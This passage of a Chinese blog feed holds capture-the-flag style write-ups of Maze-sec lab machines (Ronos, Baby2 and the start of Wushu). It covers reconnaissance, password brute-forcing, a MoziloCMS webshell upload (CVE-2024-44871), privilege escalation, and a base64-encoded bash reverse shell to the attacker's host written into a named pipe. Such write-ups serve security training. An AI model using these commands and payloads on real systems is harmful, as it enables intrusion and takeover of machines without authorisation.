将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取twansh权限"><a href="#1、获取twansh权限" class="headerlink" title="1、获取twansh权限"></a>1、获取twansh权限</h2><p>查看文件，发现<code>/opt</code>目录下面有一个管道用于twansh用户和www-data用户通信</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Ronos:/tmp$ <span class="hljs-built_in">ls</span> -la /opt/twansh_pipe/<br>total 8<br>drwxr-xr-x 2 root   root     4096 Oct  6 07:45 .<br>drwxr-xr-x 3 root   root     4096 Oct  6 11:15 ..<br>prw-rw---- 1 twansh www-data    0 Oct  6 07:45 command_pipe<br></code></pre></td></tr></table></figure><p>跑一下pspy64<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510082113954.png"></p><p>找到一个脚本<code>/usr/local/bin/twansh_pipe_service.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Ronos:/tmp$ <span class="hljs-built_in">cat</span> /usr/local/bin/twansh_pipe_service.sh <br><span class="hljs-comment">#!/bin/bash</span><br>PIPE=<span class="hljs-string">&quot;/opt/twansh_pipe/command_pipe&quot;</span><br><br>[ -p <span class="hljs-string">&quot;<span class="hljs-variable">$PIPE</span>&quot;</span> ] || <span class="hljs-built_in">exit</span> 1<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">read</span> -r cmd; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Executing: <span class="hljs-variable">$cmd</span>&quot;</span><br>        /bin/bash -c <span class="hljs-string">&quot;<span class="hljs-variable">$cmd</span>&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$PIPE</span>&quot;</span><br></code></pre></td></tr></table></figure><p>写入反弹shell的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Ronos:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNC80NDMgMD4mMSc= | base64 -d | bash&quot;</span> &gt; /opt/twansh_pipe/command_pipe<br></code></pre></td></tr></table></figure><p>成功获取到twansh权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tools]<br>└─# nc -lvnp 443 <br>listening on [any] 443 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.19] 51392<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (408): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>twansh@Ronos:/$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(twansh) gid=1000(twansh) <span class="hljs-built_in">groups</span>=1000(twansh)<br></code></pre></td></tr></table></figure><h2 id="2、获取到root权限"><a href="#2、获取到root权限" class="headerlink" title="2、获取到root权限"></a>2、获取到root权限</h2><p>上面使用<code>pspy64</code>跑了之后发现，会定时执行<code>/tmp/back.sh</code>文件<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510082133913.png"></p><p>然而<code>david/twansh/www-data/</code>唯独<code>twansh</code>的 tmp 下的命令可以被执行<code>(/tmp 目录未被挂载)</code>，因为另两用户的<code>/tmp</code>挂载在<code>/tmp</code>下的私有目录中<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510082135857.png"></p><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510082136829.png"></p><p>在用户<code>twansh</code>权限下，在<code>/tmp</code>目录下写入<code>/back.sh</code>脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">twansh@Ronos:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chmod +s /bin/bash&quot;</span> &gt; /tmp/back.sh<br>twansh@Ronos:/tmp$ <span class="hljs-built_in">chmod</span> +x back.sh<br><span class="hljs-comment">#等待执行</span><br>twansh@Ronos:/tmp$ <span class="hljs-built_in">ls</span> -la /bin/bash<br><span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash<br></code></pre></td></tr></table></figure><p>发现<code>/bin/bash</code>已经具有<code>suid</code>权限，直接执行获取root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">twansh@Ronos:/tmp$ /bin/bash -p<br><span class="hljs-built_in">id</span><br>uid=1000(twansh) gid=1000(twansh) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(twansh)<br><span class="hljs-built_in">whoami</span><br>root<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /home/twansh/user.txt /root/root.txt<br>flag&#123;user-0c4da5e7f8a886869575ae0a046f1841&#125;<br>flag&#123;root-2e01f8ba17be4864fc0d53974806ed8a&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>awk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Baby2</title>
    <link href="/Maze-sec/Baby2/"/>
    <url>/Maze-sec/Baby2/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap -sn 192.168.2.0/24                                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 15:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00046s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00041s latency).<br>MAC Address: 08:00:27:05:42:68 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.22<br>Host is up (0.00062s latency).<br>MAC Address: 08:00:27:4B:3B:00 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.16 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.22</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.22                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 15:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.22<br>Host is up (0.0012s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:4B:3B:00 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 31.42 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22和80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.22<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 15:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.22<br>Host is up (0.0019s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">MAC Address: 08:00:27:4B:3B:00 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds</span><br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、信息泄露"><a href="#1、信息泄露" class="headerlink" title="1、信息泄露"></a>1、信息泄露</h2><p>访问80端口，查看页面源码，找到提示信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# curl http://192.168.2.22                                                                    <br>index<br>&lt;!-- The new password does not comply with the rules (at least 8 characters, small and large letters and numbers). --&gt;<br>&lt;!-- Admin***  --&gt;<br></code></pre></td></tr></table></figure><p>提示：当前的密码不符合要求，并给出当前密码的提示为：<code>Admin***</code>，不知道后面三位字符</p><h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><p>根据上面的信息，应该是存在登录界面的，尝试进行目录扫描，找到登录界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.22&quot;</span><br>....<br>[16:02:05] 200 -    2KB - /wordpress/<br>....<br></code></pre></td></tr></table></figure><p>找到一个路径<code>wordpress</code>，访问发现是<code>moziloCMS</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510141601378.png"></p><p>再次对<code>/wordpress</code>进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.22/wordpress&quot;</span><br>....<br>[16:03:18] 200 -    0B  - /wordpress/admin/admin.php<br>[16:03:19] 200 -    0B  - /wordpress/admin/config.php<br>[16:03:19] 200 -   11KB - /wordpress/admin/<br>[16:03:19] 200 -    0B  - /wordpress/admin/files.php<br>[16:03:19] 200 -    0B  - /wordpress/admin/home.php<br>[16:03:20] 200 -    0B  - /wordpress/admin/login.php<br>[16:03:20] 200 -   11KB - /wordpress/admin/index.php<br>[16:03:37] 301 -  320B  - /wordpress/cms  -&gt;  http://192.168.2.22/wordpress/cms/<br>[16:03:38] 200 -  832B  - /wordpress/cms/<br>[16:03:54] 200 -    2KB - /wordpress/install.php<br>[16:03:55] 200 -    2KB - /wordpress/install.php?profile=default<br>[16:03:57] 200 -  502B  - /wordpress/layouts/<br>[16:04:13] 301 -  324B  - /wordpress/plugins  -&gt;  http://192.168.2.22/wordpress/plugins/<br>[16:04:14] 200 -  534B  - /wordpress/plugins/<br>[16:04:17] 200 -    3KB - /wordpress/README.md<br>[16:04:17] 200 -  360B  - /wordpress/readme.txt<br>[16:04:19] 200 -  114B  - /wordpress/robots.txt<br>[16:04:24] 200 -  300B  - /wordpress/sitemap.xml<br>[16:04:31] 301 -  320B  - /wordpress/tmp  -&gt;  http://192.168.2.22/wordpress/tmp/<br>[16:04:32] 200 -  485B  - /wordpress/tmp/<br>[16:04:33] 200 -    0B  - /wordpress/update.php<br>....<br></code></pre></td></tr></table></figure><p>找到登录界面的路径<code>/wordpress/admin</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510141605967.png"></p><h2 id="3、密码爆破"><a href="#3、密码爆破" class="headerlink" title="3、密码爆破"></a>3、密码爆破</h2><p>可以使用<code>burpsuite</code>对登录密码<code>Admin***</code>的后三位进行爆破，成功爆破出密码为<code>Admin123</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510141606013.png"></p><h1 id="三、MoziloCMS-3-0-RCE（CVE-2024-44871）"><a href="#三、MoziloCMS-3-0-RCE（CVE-2024-44871）" class="headerlink" title="三、MoziloCMS 3.0-RCE（CVE-2024-44871）"></a>三、MoziloCMS 3.0-RCE（CVE-2024-44871）</h1><p>利用步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs na">1. Login as admin<br>2. Go to the Files session by the left menu<br>3. Create a .jpg file with it content having a php web shell<br>4. Upload the file to the server via the upload icon and save<br>5. Rename the file to .php on the web server and save<br>6. Access webshell via this endpoint :<br>http://127.0.0.1/mozilo3.0-3.0.1/kategorien/Willkommen/dateien/revshell.php<br></code></pre></td></tr></table></figure><p>根据步骤上传一个反弹shell，成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.22] 42170<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取aristore权限"><a href="#1、获取aristore权限" class="headerlink" title="1、获取aristore权限"></a>1、获取aristore权限</h2><p>查看<code>user.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Baby2:/home/aristore$ <span class="hljs-built_in">ls</span> -la user.txt <br>-rw-r--r-- 1 root root 70 Oct 13 06:01 user.txt<br>www-data@Baby2:/home/aristore$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;fake-flag&#125;<br></code></pre></td></tr></table></figure><p>发现文件大小和实际读取出来的内容不一样，尝试反着读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Baby2:/home/aristore$ <span class="hljs-built_in">tac</span> user.txt <br>aristore:aristorearistore<br>flag&#123;user-b6cc0757c4a3108795d0803f9e82b9d3&#125;<br></code></pre></td></tr></table></figure><p>成功找到<code>aristore</code>的密码<code>aristorearistore</code>，进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Baby2:/home/aristore$ su aristore<br>Password: <br>aristore@Baby2:~$ <span class="hljs-built_in">id</span><br>uid=1000(aristore) gid=1000(aristore) <span class="hljs-built_in">groups</span>=1000(aristore)<br></code></pre></td></tr></table></figure><h2 id="2、cat被篡改"><a href="#2、cat被篡改" class="headerlink" title="2、cat被篡改"></a>2、cat被篡改</h2><p>使用<code>dpkg -V</code>查看软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">aristore@Baby2:~$ dpkg -V<br>??5?????? c /etc/irssi.conf<br>??5?????? c /etc/apache2/apache2.conf<br>??5??????   /bin/cat<br>dpkg: warning: systemd: unable to open /var/lib/polkit-1/localauthority/10-vendor.d/systemd-networkd.pkla <span class="hljs-keyword">for</span> <span class="hljs-built_in">hash</span>: Permission denied<br>??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/systemd-networkd.pkla<br>??5?????? c /etc/grub.d/10_linux<br>??5?????? c /etc/grub.d/40_custom<br>dpkg: warning: <span class="hljs-built_in">sudo</span>: unable to open /etc/sudoers <span class="hljs-keyword">for</span> <span class="hljs-built_in">hash</span>: Permission denied<br>??5?????? c /etc/sudoers<br>dpkg: warning: <span class="hljs-built_in">sudo</span>: unable to open /etc/sudoers.d/README <span class="hljs-keyword">for</span> <span class="hljs-built_in">hash</span>: Permission denied<br>??5?????? c /etc/sudoers.d/README<br>dpkg: warning: inspircd: unable to open /etc/inspircd/inspircd.conf <span class="hljs-keyword">for</span> <span class="hljs-built_in">hash</span>: Permission denied<br>??5?????? c /etc/inspircd/inspircd.conf<br>dpkg: warning: inspircd: unable to open /etc/inspircd/inspircd.motd <span class="hljs-keyword">for</span> <span class="hljs-built_in">hash</span>: Permission denied<br>??5?????? c /etc/inspircd/inspircd.motd<br>dpkg: warning: inspircd: unable to open /etc/inspircd/inspircd.rules <span class="hljs-keyword">for</span> <span class="hljs-built_in">hash</span>: Permission denied<br>??5?????? c /etc/inspircd/inspircd.rules<br>dpkg: warning: packagekit: unable to open /var/lib/polkit-1/localauthority/10-vendor.d/org.freedesktop.packagekit.pkla <span class="hljs-keyword">for</span> <span class="hljs-built_in">hash</span>: Permission denied<br>??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/org.freedesktop.packagekit.pkla<br>??5?????? c /etc/issue<br></code></pre></td></tr></table></figure><p>发现存在一个<code>/bin/cat</code></p><p>查看当前使用的<code>cat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aristore@Baby2:~$ <span class="hljs-built_in">which</span> <span class="hljs-built_in">cat</span><br>/usr/bin/cat<br></code></pre></td></tr></table></figure><p>查看<code>/bin/cat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">aristore@Baby2:~$ strings /bin/cat<br><span class="hljs-comment">#!/bin/bash</span><br>[[ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> == user.txt ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;flag&#123;fake-flag&#125;&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span> 1<br>/usr/bin/cat2 <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-comment"># b4b8daf4b8ea9d39568719e1e320076f</span><br></code></pre></td></tr></table></figure><p>找到一个哈希值&#96;b4b8daf4b8ea9d39568719e1e320076f</p><p>尝试解密，找到密码为<code>rootroot</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510141634931.png"></p><h2 id="3、获取root权限"><a href="#3、获取root权限" class="headerlink" title="3、获取root权限"></a>3、获取root权限</h2><p>使用获取到的密码进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aristore@Baby2:~$ su root<br>Password: <br>root@Baby2:/home/aristore# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Baby2:/home/aristore# <span class="hljs-built_in">cat</span> /home/aristore/user.txt /root/root.txt <br>flag&#123;user-b6cc0757c4a3108795d0803f9e82b9d3&#125;<br>aristore:aristorearistore<br>flag&#123;root-9741bedefe0f692a60ace05be4311fe5&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE-2024-44871</tag>
      
      <tag>cms-Mozilo</tag>
      
      <tag>提权-dpkg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wushu</title>
    <link href="/Maze-sec/Wushu/"/>
    <url>/Maze-sec/Wushu/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap -sn 192.168.2.0/24                <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-25 10:02 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00029s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00021s latency).<br>MAC Address: 08:00:27:79:58:95 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.17<br>Host is up (0.00064s latency).<br>MAC Address: 08:00:27:9F:9E:3E (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.15 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.17</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.17                   